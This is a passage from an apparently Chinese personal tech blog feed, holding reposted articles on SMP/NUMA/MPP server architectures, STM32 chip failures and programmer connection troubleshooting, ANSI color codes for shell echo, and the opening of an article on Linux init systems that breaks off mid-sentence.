必须通过相同的内存总线访问相同的内存资源，因此随着 CPU 数量的增加，内存访问冲突将迅速增加，最终会造成 CPU 资源的浪费，使 CPU 性能的有效性大大降低。实验证明， SMP 服务器 CPU 利用率最好的情况是 2 至 4 个 CPU 。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212144747.png"></p><p>图 1.SMP 服务器 CPU 利用率状态</p><h1 id="2-NUMA-Non-Uniform-Memory-Access"><a href="#2-NUMA-Non-Uniform-Memory-Access" class="headerlink" title="2. NUMA(Non-Uniform Memory Access)"></a><strong>2. NUMA(Non-Uniform Memory Access)</strong></h1><p>　　由于 SMP 在扩展能力上的限制，人们开始探究如何进行有效地扩展从而构建大型系统的技术， NUMA 就是这种努力下的结果之一。利用 NUMA 技术，可以把几十个 CPU( 甚至上百个 CPU) 组合在一个服务器内。其 CPU 模块结构如图 2 所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212144074.png"></p><p>图 2.NUMA 服务器 CPU 模块结构</p><p>NUMA 服务器的基本特征是具有多个 CPU 模块，每个 CPU 模块由多个 CPU( 如 4 个 ) 组成，并且具有独立的本地内存、 I&#x2F;O 槽口等。由于其节点之间可以通过互联模块 ( 如称为 Crossbar Switch) 进行连接和信息交互，因此每个 CPU 可以访问整个系统的内存 ( 这是 NUMA 系统与 MPP 系统的重要差别 ) 。显然，访问本地内存的速度将远远高于访问远地内存 ( 系统内其它节点的内存 ) 的速度，这也是非一致存储访问 NUMA 的由来。由于这个特点，为了更好地发挥系统性能，开发应用程序时需要尽量减少不同 CPU 模块之间的信息交互。</p><p>利用 NUMA 技术，可以较好地解决原来 SMP 系统的扩展问题，在一个物理服务器内可以支持上百个 CPU 。比较典型的 NUMA 服务器的例子包括 HP 的 Superdome 、 SUN15K 、 IBMp690 等。</p><p>　　但 NUMA 技术同样有一定缺陷，由于访问远地内存的延时远远超过本地内存，因此当 CPU 数量增加时，系统性能无法线性增加。如 HP 公司发布 Superdome 服务器时，曾公布了它与 HP 其它 UNIX 服务器的相对性能值，结果发现， 64 路 CPU 的 Superdome (NUMA 结构 ) 的相对性能值是 20 ，而 8 路 N4000( 共享的 SMP 结构 ) 的相对性能值是 6.3 。从这个结果可以看到， 8 倍数量的 CPU 换来的只是 3 倍性能的提升。</p><h1 id="3-MPP-Massive-Parallel-Processing"><a href="#3-MPP-Massive-Parallel-Processing" class="headerlink" title="3. MPP(Massive Parallel Processing)"></a><strong>3. MPP(Massive Parallel Processing)</strong></h1><p>　　和 NUMA 不同， MPP 提供了另外一种进行系统扩展的方式，它由多个 SMP 服务器通过一定的节点互联网络进行连接，协同工作，完成相同的任务，从用户的角度来看是一个服务器系统。其基本特征是由多个 SMP 服务器 ( 每个 SMP 服务器称节点 ) 通过节点互联网络连接而成，每个节点只访问自己的本地资源 ( 内存、存储等 ) ，是一种完全无共享 (Share Nothing) 结构，因而扩展能力最好，理论上其扩展无限制，目前的技术可实现 512 个节点互联，数千个 CPU 。目前业界对节点互联网络暂无标准，如 NCR 的 Bynet ， IBM 的 SPSwitch ，它们都采用了不同的内部实现机制。但节点互联网仅供 MPP 服务器内部使用，对用户而言是透明的。</p><p>　　在 MPP 系统中，每个 SMP 节点也可以运行自己的操作系统、数据库等。但和 NUMA 不同的是，它不存在异地内存访问的问题。换言之，每个节点内的 CPU 不能访问另一个节点的内存。节点之间的信息交互是通过节点互联网络实现的，这个过程一般称为数据重分配 (Data Redistribution) 。</p><p>但是 MPP 服务器需要一种复杂的机制来调度和平衡各个节点的负载和并行处理过程。目前一些基于 MPP 技术的服务器往往通过系统级软件 ( 如数据库 ) 来屏蔽这种复杂性。举例来说， NCR 的 Teradata 就是基于 MPP 技术的一个关系数据库软件，基于此数据库来开发应用时，不管后台服务器由多少个节点组成，开发人员所面对的都是同一个数据库系统，而不需要考虑如何调度其中某几个节点的负载。</p><p>MPP (Massively Parallel Processing)，大规模并行处理系统，这样的系统是由许多松耦合的处理单元组成的，要注意的是这里指的是处理单元而不是处理器。每个单元内的CPU都有自己私有的资源，如总线，内存，硬盘等。在每个单元内都有操作系统和管理数据库的实例复本。这种结构最大的特点在于不共享资源。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212144746.png"></p><h1 id="4-三种体系架构之间的差异"><a href="#4-三种体系架构之间的差异" class="headerlink" title="4. 三种体系架构之间的差异"></a>4. 三种体系架构之间的差异</h1><p>4.1 <a href="http://ericssonxiao1981.spaces.live.com/blog/cns!75A884AA4C1BBE50!521.entry">SMP系统与MPP系统比较</a></p><p>既然有两种结构，那它们各有什么特点呢？采用什么结构比较合适呢？通常情况下，MPP系统因为要在不同处理单元之间传送信息（请注意上图），所以它的效率要比SMP要差一点，但是这也不是绝对的，因为MPP系统不共享资源，因此对它而言，资源比SMP要多，当需要处理的事务达到一定规模时，MPP的效率要比SMP好。这就是看通信时间占用计算时间的比例而定，如果通信时间比较多，那MPP系统就不占优势了，相反，如果通信时间比较少，那MPP系统可以充分发挥资源的优势，达到高效率。当前使用的OTLP程序中，用户访问一个中心数据库，如果采用SMP系统结构，它的效率要比采用MPP结构要快得多。而MPP系统在决策支持和数据挖掘方面显示了优势，可以这样说，如果操作相互之间没有什么关系，处理单元之间需要进行的通信比较少，那采用MPP系统就要好，相反就不合适了。</p><p>通过上面两个图我们可以看到，对于SMP来说，制约它速度的一个关键因素就是那个共享的总线，因此对于DSS程序来说，只能选择MPP，而不能选择SMP，当大型程序的处理要求大于共享总线时，总线就没有能力进行处理了，这时SMP系统就不行了。当然了，两个结构互有优缺点，如果能够将两种结合起来取长补短，当然最好了。  </p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212144752.png"></p><h1 id="4-2-NUMA-与-MPP-的区别"><a href="#4-2-NUMA-与-MPP-的区别" class="headerlink" title="4.2 NUMA 与 MPP 的区别"></a><strong>4.2 NUMA</strong> <strong>与</strong> <strong>MPP</strong> <strong>的区别</strong></h1><p>　　从架构来看， NUMA 与 MPP 具有许多相似之处：它们都由多个节点组成，每个节点都具有自己的 CPU 、内存、 I&#x2F;O ，节点之间都可以通过节点互联机制进行信息交互。那么它们的区别在哪里？通过分析下面 NUMA 和 MPP 服务器的内部架构和工作原理不难发现其差异所在。</p><p>　　首先是节点互联机制不同， NUMA 的节点互联机制是在同一个物理服务器内部实现的，当某个 CPU 需要进行远地内存访问时，它必须等待，这也是 NUMA 服务器无法实现 CPU 增加时性能线性扩展的主要原因。而 MPP 的节点互联机制是在不同的 SMP 服务器外部通过 I&#x2F;O 实现的，每个节点只访问本地内存和存储，节点之间的信息交互与节点本身的处理是并行进行的。因此 MPP 在增加节点时性能基本上可以实现线性扩展。</p><p>其次是内存访问机制不同。在 NUMA 服务器内部，任何一个 CPU 可以访问整个系统的内存，但远地访问的性能远远低于本地内存访问，因此在开发应用程序时应该尽量避免远地内存访问。在 MPP 服务器中，每个节点只访问本地内存，不存在远地内存访问的问题。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406212144519.png"></p><p>图 3.MPP 服务器架构图</p><p><strong>数据仓库的选择</strong></p><p>　　哪种服务器更加适应数据仓库环境？这需要从数据仓库环境本身的负载特征入手。众所周知，典型的数据仓库环境具有大量复杂的数据处理和综合分析，要求系统具有很高的 I&#x2F;O 处理能力，并且存储系统需要提供足够的 I&#x2F;O 带宽与之匹配。而一个典型的 OLTP 系统则以联机事务处理为主，每个交易所涉及的数据不多，要求系统具有很高的事务处理能力，能够在单位时间里处理尽量多的交易。显然这两种应用环境的负载特征完全不同。</p><p>　　从 NUMA 架构来看，它可以在一个物理服务器内集成许多 CPU ，使系统具有较高的事务处理能力，由于远地内存访问时延远长于本地内存访问，因此需要尽量减少不同 CPU 模块之间的数据交互。显然， NUMA 架构更适用于 OLTP 事务处理环境，当用于数据仓库环境时，由于大量复杂的数据处理必然导致大量的数据交互，将使 CPU 的利用率大大降低。</p><p>相对而言， MPP 服务器架构的并行处理能力更优越，更适合于复杂的数据综合分析与处理环境。当然，它需要借助于支持 MPP 技术的关系数据库系统来屏蔽节点之间负载平衡与调度的复杂性。另外，这种并行处理能力也与节点互联网络有很大的关系。显然，适应于数据仓库环境的 MPP 服务器，其节点互联网络的 I&#x2F;O 性能应该非常突出，才能充分发挥整个系统的性能。</p><h1 id="4-3-NUMA、MPP、SMP之间性能的区别"><a href="#4-3-NUMA、MPP、SMP之间性能的区别" class="headerlink" title="4.3 NUMA、MPP、SMP之间性能的区别"></a><strong>4.3 NUMA</strong>、<strong><strong>MPP</strong></strong>、<strong><strong>SMP</strong></strong>之间性能的区别</h1><p>NUMA的节点互联机制是在同一个物理服务器内部实现的，当某个CPU需要进行远地内存访问时，它必须等待，这也是NUMA服务器无法实现CPU增加时性能线性扩展。</p><p>MPP的节点互联机制是在不同的SMP服务器外部通过I&#x2F;O实现的，每个节点只访问本地内存和存储，节点之间的信息交互与节点本身的处理是并行进行的。因此MPP在增加节点时性能基本上可以实现线性扩展。</p><p>SMP所有的CPU资源是共享的，因此完全实现线性扩展。</p><h1 id="4-4-NUMA、MPP、SMP之间扩展的区别"><a href="#4-4-NUMA、MPP、SMP之间扩展的区别" class="headerlink" title="4.4 NUMA、MPP、SMP之间扩展的区别"></a><strong>4.4 NUMA</strong>、MPP、SMP之间扩展的区别</h1><p>NUMA理论上可以无限扩展，目前技术比较成熟的能够支持上百个CPU进行扩展。如HP的SUPERDOME。</p><p>MPP理论上也可以实现无限扩展，目前技术比较成熟的能够支持512个节点，数千个CPU进行扩展。</p><p>SMP扩展能力很差，目前2个到4个CPU的利用率最好，但是IBM的BOOK技术，能够将CPU扩展到8个。</p><p>MPP是由多个SMP构成，多个SMP服务器通过一定的节点互联网络进行连接，协同工作，完成相同的任务。</p><h1 id="4-5-MPP和SMP、NUMA-应用之间的区别"><a href="#4-5-MPP和SMP、NUMA-应用之间的区别" class="headerlink" title="4.5 MPP和SMP、NUMA****应用之间的区别"></a><strong>4.5 MPP<strong><strong>和</strong></strong>SMP<strong><strong>、</strong></strong>NUMA****应用之间的区别</strong></h1><p><strong>MPP</strong>的优势：</p><p>MPP系统不共享资源，因此对它而言，资源比SMP要多，当需要处理的事务达到一定规模时，MPP的效率要比SMP好。由于MPP系统因为要在不同处理单元之间传送信息，在通讯时间少的时候，那MPP系统可以充分发挥资源的优势，达到高效率。也就是说：操作相互之间没有什么关系，处理单元之间需要进行的通信比较少，那采用MPP系统就要好。因此，<strong>MPP****系统在决策支持和数据挖掘方面显示了优势。</strong></p><p><strong>SMP</strong>的优势：</p><p>MPP系统因为要在不同处理单元之间传送信息，所以它的效率要比SMP要差一点。在通讯时间多的时候，那MPP系统可以充分发挥资源的优势。<strong>因此当前使用的<strong><strong>OTLP</strong></strong>程序中，用户访问一个中心数据库，如果采用<strong><strong>SMP</strong></strong>系统结构，它的效率要比采用<strong><strong>MPP</strong></strong>结构要快得多。</strong></p><p><strong>NUMA</strong>架构的优势：</p><p>NUMA架构来看，它可以在一个物理服务器内集成许多CPU，使系统具有较高的事务处理能力，由于远地内存访问时延远长于本地内存访问，因此需要尽量减少不同CPU模块之间的数据交互。显然，NUMA架构更适用于OLTP事务处理环境，当用于数据仓库环境时，由于大量复杂的数据处理必然导致大量的数据交互，将使CPU的利用率大大降低。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.cnblogs.com/yubo/archive/2010/04/23/1718810.html">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于STM系列芯片损坏的问题</title>
    <link href="/2024/06/16/%E5%85%B3%E4%BA%8ESTM%E7%B3%BB%E5%88%97%E8%8A%AF%E7%89%87%E6%8D%9F%E5%9D%8F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <url>/2024/06/16/%E5%85%B3%E4%BA%8ESTM%E7%B3%BB%E5%88%97%E8%8A%AF%E7%89%87%E6%8D%9F%E5%9D%8F%E7%9A%84%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>总结一些关于STM系列芯片损坏的问题，希望能帮助到大家。</p><span id="more"></span><p>发在该区的这个帖子不是来砸场子的，因为我也是个STM32芯片的忠实用户。<br>从08年接触这个片子，一直用到现在，感觉还是非常好用的。比51和AVR要高端，比DSP2407要方便用，便宜。非常高的性价比让大家对它的市场一片看好。<br>我真的感觉这款芯片快要代替51的地位了。</p><p>相对来说，这个片子还是很好用的，我们已经量产过几款产品了，这个芯片焊接的成功率，应用的报废率都还是很不错。<br>但是在调试的时候，有些阶段还是出现过很多奇怪的芯片烧坏问题。<br>相信大家在初次拿到开发板的时候，总是会担心如果芯片烧坏了，那该怎么办，特别是老是烧坏的情况。<br>那么，你手上的芯片坏过么？都是怎么坏的呢？如何保护芯片不让它坏掉呢？欢迎大家来讨论和分享</p><p>——————————————————————————————————————————</p><p>我说一下我这边的几点心得，算是抛砖引玉吧。<br>说明一点，这里讨论的都是把供货问题，焊接问题给排除外了，也就是说，能够正常用一段时间的，然后又忽然坏掉的情况。  </p><h2 id="STM32损坏的症状及分析"><a href="#STM32损坏的症状及分析" class="headerlink" title="STM32损坏的症状及分析"></a>STM32损坏的症状及分析</h2><ol><li><p>意外的，电源和地就短路了。<br>    这是我遇到的最多的芯片损坏的症状，芯片会发热，甚至滚烫，所有3.3V的供电都被拉低，可以用万用表打引脚是短路的。<br>    关于原因，还不是很确定，初步分析可能是由于信号或者电源冲击损坏的。因为这种情况好像有一般都出现在正常工作的过程中，没有太多人机接触的动作。</p></li><li><p>供电正常，但是不能连上JTAG<br>    这种情况让人很无奈，就是无法连接JTAG，无法识别芯片<br>    原因感觉可能是由于静电损坏，因为这个情况一般出现在频繁下载程序的时候。不调试的话，一般不怎么出现这种问题</p></li><li><p>下载程序的时候，能够通过JTAG识别芯片型号，但是下载的时候却报“找不到Cortex-M3”等乱七八糟的错<br>    这也是会遇到的情况之一，跟2很像，但更加无奈。<br>    这个原因也不得而知，反正只好换芯片就好了。</p></li><li><p>某个IO口损坏<br>    这个也损坏也比较温和，损坏后，就只单单这一个IO口的功能失效，无论怎么控制，都一直是一个电平，有时甚至稳定在1.2V等中间一个值。这就是传说中的烧IO口的情况。但是其他引脚及功能全部都正常。<br>    原因嘛，一般会认为是外部的强大干扰造成的IO口内部损坏。</p></li></ol><p>我想到的就这么多，欢迎大家再继续添加。</p><h1 id="芯片连接不上怎么办"><a href="#芯片连接不上怎么办" class="headerlink" title="芯片连接不上怎么办"></a>芯片连接不上怎么办</h1><h2 id="1：排除线材问题"><a href="#1：排除线材问题" class="headerlink" title="1：排除线材问题"></a>1：排除线材问题<a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/#1%E6%8E%92%E9%99%A4%E7%BA%BF%E6%9D%90%E9%97%AE%E9%A2%98" title="直接链接到标题"></a></h2><p>用万用表自测所用杜邦线是否导通。</p><ul><li>正确连接红表笔和黑表笔</li><li>将红黑表笔接在要测量线的两端</li><li>如果指针电阻接近于零，或者比较小，则说明线是连通的，若是电阻很大则说明线是断开的。 经过上述操作若判断出线材存在一定问题，则需更换下线材再进行操作。</li></ul><h2 id="2：排除硬件问题"><a href="#2：排除硬件问题" class="headerlink" title="2：排除硬件问题"></a>2：排除硬件问题<a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/#2%E6%8E%92%E9%99%A4%E7%A1%AC%E4%BB%B6%E9%97%AE%E9%A2%98" title="直接链接到标题"></a></h2><ul><li>首先打开芯片相应的数据手册查找芯片对应的电源引脚和烧录口，然后确保硬件焊接正常后给芯片接上电源；</li><li>不连接烧录口，比如SWDIO和SWDCLK, 用万用表测量一下SWDIO的电压；</li><li>如果芯片为空片或者没有复用SWDIO引脚的情况下，SWDIO引脚是有和芯片电源一样的电压的，如果没有的话则硬件有异常，请检查下硬件。</li></ul><p>以下资料仅供参考：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161640346.png"></p><h2 id="3：排除烧录器接线问题"><a href="#3：排除烧录器接线问题" class="headerlink" title="3：排除烧录器接线问题"></a>3：排除烧录器接线问题<a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/#3%E6%8E%92%E9%99%A4%E7%83%A7%E5%BD%95%E5%99%A8%E6%8E%A5%E7%BA%BF%E9%97%AE%E9%A2%98" title="直接链接到标题"></a></h2><ul><li><p>打开Power Writer软件，根据芯片型号选择相应的型号，并且可以查看相应的连接图：</p></li><li><p>点击菜单栏的工具按钮，可以查看相应烧录器的接口定义；</p></li><li><p>优先使用烧录器配备的连接线并确保连接稳定；</p></li><li><p>确保相应的电源和烧录口连接正常，连接正常的话，软件日志会显示 <strong><em>目标芯片已连接</em></strong></p></li><li><p>有关接线详情以及烧录器引脚分布描述见 <a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/connection">关于接线</a> <img src="https://docs.powerwriter.com/assets/images/image-3-4654b39548c5735f85510815c8f757f4.png" alt="image-3"></p></li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161641116.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161641667.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161641473.png"></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161642710.png"></p><h2 id="4：排除IO复用烧录引脚导致的问题"><a href="#4：排除IO复用烧录引脚导致的问题" class="headerlink" title="4：排除IO复用烧录引脚导致的问题"></a>4：排除IO复用烧录引脚导致的问题<a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/#4%E6%8E%92%E9%99%A4io%E5%A4%8D%E7%94%A8%E7%83%A7%E5%BD%95%E5%BC%95%E8%84%9A%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98" title="直接链接到标题"></a></h2><ul><li>当芯片运行的程序有复用引脚时，在连接时推荐只使用烧录器的电源接口；</li><li>当使用外部供电时，请连接上复位引脚；</li><li>芯片复用引脚时，编译器例如KEIL等软件可能会连接不上芯片，需要使用Power Writer软件擦除下芯片后再重新调试；</li><li>在程序中复用芯片的烧录引脚时，推荐在其之前加入2~20ms左右的延时；</li></ul><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161642016.png"></p><h2 id="5：排除芯片本身坏掉导致的问题"><a href="#5：排除芯片本身坏掉导致的问题" class="headerlink" title="5：排除芯片本身坏掉导致的问题"></a>5：排除芯片本身坏掉导致的问题<a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/#5%E6%8E%92%E9%99%A4%E8%8A%AF%E7%89%87%E6%9C%AC%E8%BA%AB%E5%9D%8F%E6%8E%89%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98" title="直接链接到标题"></a></h2><ul><li>更换新的芯片</li><li>更换新的PCB板</li><li>更换别的芯片型号</li></ul><h2 id="6：尝试调整时钟速度"><a href="#6：尝试调整时钟速度" class="headerlink" title="6：尝试调整时钟速度"></a>6：尝试调整时钟速度<a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/#6%E5%B0%9D%E8%AF%95%E8%B0%83%E6%95%B4%E6%97%B6%E9%92%9F%E9%80%9F%E5%BA%A6" title="直接链接到标题"></a></h2><p>在不同的环境下，PowerWriter 烧录器模式的时钟速度，高于 Debugger 模式的时钟，比如在MDK 系统环境下，默认为1Mhz 的时钟速度，PowerWrier 默认的时钟是10Mhz, 可能存在MDK 能连接目标芯片，但是PowerWriter 连接失败的情况，可以尝试降低时钟速度到比如：<strong>5Mhz</strong> 等，部分应用环境下，MCU固件中开启了读保护的，需要<strong>更快的速度去连接目标芯片，这时就需要调整到更高的时钟速度</strong>，否则可能出现握手失败的情况(<strong>系统进入了保护状态，调试口被关闭</strong>)，修改完时钟配置之后，重新点击应用设置，同步设置到PowerWriter 设备，如下图所示：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406161642094.png"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>上面的文章中提到了一些关于 STM系列芯片 出现错误的原因。主要就是遇到无法调试的情况，或者是烧坏的情况。  </p><p>对于芯片是否损坏的判断，还可以通过使用示波器来查看。</p><p>在使用单片机的时候需要格外注意<strong>电流、电压的大小</strong>。如果电流、电压大小不合适的话则会导致芯片烧坏。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://www.xiaopingtou.cn/q-158287/15.html">原文01</a></li><li><a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/target_connect/">原文02</a></li><li><a href="https://docs.powerwriter.com/docs/faq/powerwriter/base/007.1debug%20question/">常见烧录失败的原因</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>硬件</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell脚本中echo显示带颜色的内容</title>
    <link href="/2024/06/09/shell%E8%84%9A%E6%9C%AC%E4%B8%ADecho%E6%98%BE%E7%A4%BA%E5%B8%A6%E9%A2%9C%E8%89%B2%E7%9A%84%E5%86%85%E5%AE%B9/"/>
    <url>/2024/06/09/shell%E8%84%9A%E6%9C%AC%E4%B8%ADecho%E6%98%BE%E7%A4%BA%E5%B8%A6%E9%A2%9C%E8%89%B2%E7%9A%84%E5%86%85%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>对于 shell 脚本中 echo 打印出带颜色的显示内容进行总结</p><span id="more"></span><p>shell 脚本中echo打印出带颜色的显示内容<br>shell脚本中echo显示内容带颜色需要使用参数-e<br>格式如下：</p><p>shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e &quot;\033[字背景颜色;文字颜色m字符串内容\033[0m&quot;<br></code></pre></td></tr></table></figure><p>例如：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202406092334566.png"></p><p>其中字背景颜色40：为黑色，文字颜色31m：为红色</p><p><strong>注释：</strong></p><ul><li>字背景颜色和文字内容颜色之间的是英文符号 <strong>;</strong></li><li>文字颜色后面有个m</li><li>字符串内容前后可以没有空格，如果有，同样会输出空格</li></ul><p><strong>下面是相应的字和背景颜色，大家可以随意如何！</strong></p><p><strong>字颜色： 30–37</strong></p><p>shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e “\033[30m 黑色字 \033[0m” echo -e “\033[31m 红色字 \033[0m” echo -e “\033[32m 绿色字 \033[0m” echo -e “\033[33m 黄色字 \033[0m” echo -e “\033[34m 蓝色字 \033[0m” echo -e “\033[35m 紫色字 \033[0m” echo -e “\033[36m 天蓝字 \033[0m” echo -e “\033[37m 白色字 \033[0m”<br></code></pre></td></tr></table></figure><p><strong>字背景颜色范围：40–47</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">echo -e “\033[40;37m 黑底白字 \033[0m” <br>echo -e “\033[41;37m 红底白字 \033[0m” <br>echo -e “\033[42;37m 绿底白字 \033[0m” <br>echo -e “\033[43;37m 黄底白字 \033[0m” <br>echo -e “\033[44;37m 蓝底白字 \033[0m” <br>echo -e “\033[45;37m 紫底白字 \033[0m” <br>echo -e “\033[46;37m 天蓝底白字 \033[0m” <br>echo -e “\033[47;30m 白底黑字 \033[0m” <br></code></pre></td></tr></table></figure><p><strong>最后面控制选项说明：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>\33[0m 关闭所有属性 <br>\33[1m 设置高亮度 <br>\33[4m 下划线 <br>\33[5m 闪烁 <br>\33[7m 反显 <br>\33[8m 消隐 <br>\33[30m — \33[37m 设置前景色 <br>\33[40m — \33[47m 设置背景色 <br>\33[nA 光标上移n行 <br>\33[nB 光标下移n行 <br>\33[nC 光标右移n行 <br>\33[nD 光标左移n行 <br>\33[y;xH设置光标位置 <br>\33[2J 清屏 <br>\33[K 清除从光标到行尾的内容 <br>\33[s 保存光标位置 <br>\33[u 恢复光标位置 <br>\33[?25l 隐藏光标 <br>\33[?25h 显示光标<br></code></pre></td></tr></table></figure><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://cntsp.github.io/2019/12/17/shell%E8%84%9A%E6%9C%AC%E4%B8%ADecho%E6%98%BE%E7%A4%BA%E5%B8%A6%E9%A2%9C%E8%89%B2%E7%9A%84%E5%86%85%E5%AE%B9/">原文</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>shell</category>
      
    </categories>
    
    
    <tags>
      
      <tag>转载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux中的初始化系统</title>
    <link href="/2024/06/09/Linux%E4%B8%AD%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E7%B3%BB%E7%BB%9F/"/>
    <url>/2024/06/09/Linux%E4%B8%AD%E7%9A%84%E5%88%9D%E5%A7%8B%E5%8C%96%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<p>总结常见的 Linux 系统的初始化系统，包括 sysvinit、UpStart、systemd。</p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在 Linux 系统中，具有多种多样的初始化系统(init system)，它们的主要作用是在 Linux 系统初始化的时候进行工作。本文将介绍三个主要的Init系统：sysvinit、UpStart、systemd。</p><p>首先，我们需要知道 Linux 系统的启动过程。</p><h1 id="Linux系统启动过程"><a href="#Linux系统启动过程" class="headerlink" title="Linux系统启动过程"></a>Linux系统启动过程</h1><p>什么是Init(initial:原始，初始，开始)系统，init系统的历史和现状</p><p>Linux操作系统的启动首先从<code>BIOS</code>开始，接下来进入<code>boot loader</code>，由<code>boot loader</code>载入系统内核，进行内核的初始化。内核初始化的最后一步就是启动<code>pid</code>为1 的<code>init</code>进程。这个进程是系统的第一个进程，它负责产生其它所有用户进程。</p><p><code>init</code>进程以守护进程方式存在，是所有其它进程的祖先，<code>init</code>进程非常独特，能够完成其它进程无法完成的任务。<code>Init</code>系统能够定义、管理和控制<code>init</code>进程的行为，它负载组织和运行许多独立的或相关的初始化工作(因此被称为init系统)，从而让计算机系统进入某种用户预定的运行模式。</p><p>仅仅将内核运行起来是毫无实际用途的，必须由init系统将系统带入可以操作状态。比如启动壳shell之后，便有了人机交互的可能，这样就可以让计算机执行一些预定程序完成有实际意义的任务，或者启动X图形系统以便提供更佳的人机界面，更加高效的完成任务，这里字符界面的shell 或者 X系统都是一种预设的运行模式。</p><h1 id="Sysvinit"><a href="#Sysvinit" class="headerlink" title="Sysvinit"></a>Sysvinit</h1><p>大多数<code>Linux</code>发行版的<code>init</code>系统是和<code>System V</code>相兼容的，被称为<code>sysvinit</code>。这是人们最熟悉的init系统。一些发行版如<code>Slackware</code>采用的是<code>BSD</code>风格的<code>Init</code>系统,这种风格使用较少，本文不涉及，其它的发行版如果Gentoo是自己定制的。<code>Ubuntu</code> 和 <code>RHEL</code> 采用<code>upstart</code>替代了传统的<code>sysvinit</code>。而<code>Fedora</code>从版本15开始使用了一个被称为<code>systemd</code>的新<code>init</code>系统.</p><p>可以看到不同的发行版采用了不同的init实现，本系列文章打算讲述三个主要的Init系统： sysvinit、UpStart、systemd。了解他们各自的涉及特定，并简要介绍它们的使用。</p><p>sysvinit 就是system V风格的init系统，顾名思义，它源于System V系列UNIX。它提供了比BSD风格init系统更搞高的灵活性，是已经风行了几十年的UNIX init系统，一直被各类Linux发行版所采用。</p><h2 id="运行级别"><a href="#运行级别" class="headerlink" title="运行级别"></a><strong>运行级别</strong></h2><p>Sysvinit 用术语 runlevel 来定义“预定的运行模式”。Sysvinit 检查<code>/etc/inittab</code> 文件中是否含有<code>initdefault</code>项。这告诉init系统是否有一个默认运行模式。如果没有默认的运行模式，那么用户将进入系统控制台，手动决定进入何种运行模式。sysvinit中运行模式描述了系统各种预定的运行模式，通常会有8中运行模式，即运行模式0到6和S或者 s。</p><p>每种Linux发行版对运行模式的定义都不太一样，但是 0，1，6却得到了大家的一直赞同：</p><ul><li>0 关机</li><li>1 单用户模式</li><li>6 重启</li></ul><p>通常在 <code>/etc/inittab</code> 文件中定义了各种运行模式的工作范围。比如 <code>RedHat</code> 定义了 <code>runlevel 3</code> 和5。运行模式3 将系统初始化为字符界面的shell模式；运行模式5将系统初始化为GUI模式。无论是 命令行界面 还是 GUI ，运行模式3和5相对于其它运行模式而言都是完整的正式的运行状态，计算机可以完成用户需要的任务。而模式1，S等往往用于系统故障之后的排错和恢复。</p><p>很显然，这些不同的运行模式下系统需要初始化运行的进程和需要进行的初始化准备都是不同的。比如 运行模式3 